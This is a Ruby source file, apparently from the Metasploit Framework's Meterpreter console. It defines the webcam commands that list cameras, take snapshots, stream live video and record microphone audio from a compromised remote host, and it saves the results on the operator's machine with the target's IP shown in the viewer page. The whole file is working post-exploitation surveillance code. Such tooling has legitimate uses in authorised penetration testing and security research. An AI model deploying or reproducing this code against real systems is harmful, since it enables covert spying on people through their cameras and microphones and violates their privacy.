# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Webcam - Capture video from the remote system
#
###
class Console::CommandDispatcher::Stdapi::Webcam

  Klass = Console::CommandDispatcher::Stdapi::Webcam

  include Console::CommandDispatcher

  #
  # List of supported commands.
  #
  def commands
    all = {
      "webcam_list"   => "List webcams",
      "webcam_snap"   => "Take a snapshot from the specified webcam",
      "webcam_stream" => "Play a video stream from the specified webcam",
      "record_mic"    => "Record audio from the default microphone for X seconds"
    }
    reqs = {
      "webcam_list"   => [ "webcam_list" ],
      "webcam_snap"   => [ "webcam_start", "webcam_get_frame", "webcam_stop" ],
      "webcam_stream" => [ "webcam_start", "webcam_get_frame", "webcam_stop" ],
      "record_mic"    => [ "webcam_audio_record" ],
    }

    all.delete_if do |cmd, desc|
      del = false
      reqs[cmd].each do |req|
        next if client.commands.include? req
        del = true
        break
      end

      del
    end

    all
  end

  #
  # Name for this dispatcher
  #
  def name
    "Stdapi: Webcam"
  end

  def cmd_webcam_list
    begin
      client.webcam.webcam_list.each_with_index { |name, indx|
        print_line("#{indx + 1}: #{name}")
      }
      return true
    rescue
      print_error("No webcams were found")
      return false
    end
  end

  def cmd_webcam_snap(*args)
    path    = Rex::Text.rand_text_alpha(8) + ".jpeg"
    quality = 50
    view    = true
    index   = 1
    wc_list = []

    webcam_snap_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner" ],
      "-i" => [ true, "The index of the webcam to use (Default: 1)" ],
      "-q" => [ true, "The JPEG image quality (Default: '#{quality}')" ],
      "-p" => [ true, "The JPEG image path (Default: '#{path}')" ],
      "-v" => [ true, "Automatically view the JPEG image (Default: '#{view}')" ]
    )

    webcam_snap_opts.parse( args ) { | opt, idx, val |
      case opt
        when "-h"
          print_line( "Usage: webcam_snap [options]\n" )
          print_line( "Grab a frame from the specified webcam." )
          print_line( webcam_snap_opts.usage )
          return
        when "-i"
          index = val.to_i
        when "-q"
          quality = val.to_i
        when "-p"
          path = val
        when "-v"
          view = false if ( val =~ /^(f|n|0)/i )
      end
    }
    begin
      wc_list << client.webcam.webcam_list
    rescue
    end
    if wc_list.length > 0
      begin
        print_status("Starting...")
        client.webcam.webcam_start(index)
        data = client.webcam.webcam_get_frame(quality)
        print_good("Got frame")
      ensure
        client.webcam.webcam_stop
        print_status("Stopped")
      end

      if( data )
        ::File.open( path, 'wb' ) do |fd|
          fd.write( data )
        end
        path = ::File.expand_path( path )
        print_line( "Webcam shot saved to: #{path}" )
        Rex::Compat.open_file( path ) if view
      end
      return true
    else
      print_error("No webcams where found")
      return false
    end
  end


  def cmd_webcam_stream(*args)
    print_status("Starting...")
    stream_path    = Rex::Text.rand_text_alpha(8) + ".jpeg"
    player_path = Rex::Text.rand_text_alpha(8) + ".html"
    duration = 1800
    quality  = 50
    view     = true
    index    = 1
    wc_list  = []

    webcam_snap_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner" ],
      "-d" => [ true, "The stream duration in seconds (Default: 1800)" ], # 30 min
      "-i" => [ true, "The index of the webcam to use (Default: 1)" ],
      "-q" => [ true, "The stream quality (Default: '#{quality}')" ],
      "-s" => [ true, "The stream file path (Default: '#{stream_path}')" ],
      "-t" => [ true, "The stream player path (Default: #{player_path})"],
      "-v" => [ true, "Automatically view the stream (Default: '#{view}')" ]
    )

    webcam_snap_opts.parse( args ) { | opt, idx, val |
      case opt
        when "-h"
          print_line( "Usage: webcam_stream [options]\n" )
          print_line( "Stream from the specified webcam." )
          print_line( webcam_snap_opts.usage )
          return
        when "-d"
          duration = val.to_i
        when "-i"
          index = val.to_i
        when "-q"
          quality = val.to_i
        when "-s"
          stream_path = val
        when "-t"
          player_path = val
        when "-v"
          view = false if ( val =~ /^(f|n|0)/i )
      end
    }

    print_status("Preparing player...")
    html = %Q|<html>
<head>
<META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
<title>Metasploit webcam_stream - #{client.sock.peerhost}</title>
<script language="javascript">
function updateStatus(msg) {
  var status = document.getElementById("status");
  status.innerText = msg;
}

function noImage() {
  document.getElementById("streamer").style = "display:none";
  updateStatus("Waiting");
}

var i = 0;
function updateFrame() {
  var img = document.getElementById("streamer");
  img.src = "#{stream_path}#" + i;
  img.style = "display:";
  updateStatus("Playing");
  i++;
}

setInterval(function() {
  updateFrame();
},25);

</script>
</head>
<body>
<noscript>
  <h2><font color="red">Error: You need Javascript enabled to watch the stream.</font></h2>
</noscript>
<pre>
Target IP  : #{client.sock.peerhost}
Start time : #{Time.now}
Status     : <span id="status"></span>
</pre>
<br>
<img onerror="noImage()" id="streamer">
<br><br>
<a href="http://www.metasploit.com" target="_blank">www.metasploit.com</a>
</body>
</html>
    |

    ::File.open(player_path, 'wb') do |f|
      f.write(html)
    end
    if view
      print_status("Opening player at: #{player_path}")
      Rex::Compat.open_file(player_path) 
    else
      print_status("Please open the player manually with a browser: #{interface_path}")
    end

    print_status("Streaming...")
    begin
      client.webcam.webcam_start(index)
      ::Timeout.timeout(duration) {
        while client do
          data = client.webcam.webcam_get_frame(quality)
          if data
            ::File.open(stream_path, 'wb') do |f|
             f.write(data)
            end
            data = nil
          end
        end
      }
    rescue ::Timeout::Error
    ensure
      client.webcam.webcam_stop
    end

    print_status("Stopped")
  end

  def cmd_record_mic(*args)
    path    = Rex::Text.rand_text_alpha(8) + ".wav"
    play    = true
    duration   = 1

    record_mic_opts = Rex::Parser::Arguments.new(
      "-h" => [ false, "Help Banner" ],
      "-d" => [ true, "Number of seconds to record (Default: 1)" ],
      "-f" => [ true, "The wav file path (Default: '#{::File.expand_path( "[randomname].wav" )}')" ],
      "-p" => [ true, "Automatically play the captured audio (Default: '#{play}')" ]
    )

    record_mic_opts.parse( args ) { | opt, idx, val |
      case opt
        when "-h"
          print_line( "Usage: record_mic [options]\n" )
          print_line( "Records audio from the default microphone." )
          print_line( record_mic_opts.usage )
          return
        when "-d"
          duration = val.to_i
        when "-f"
          path = val
        when "-p"
          play = false if ( val =~ /^(f|n|0)/i )
      end
    }

    print_status("Starting...")
    data = client.webcam.record_mic(duration)
    print_status("Stopped")

    if( data )
      ::File.open( path, 'wb' ) do |fd|
        fd.write( data )
      end
      path = ::File.expand_path( path )
      print_line( "Audio saved to: #{path}" )
      Rex::Compat.play_sound( path ) if play
    end
    return true
  end

end

end
end
end
end

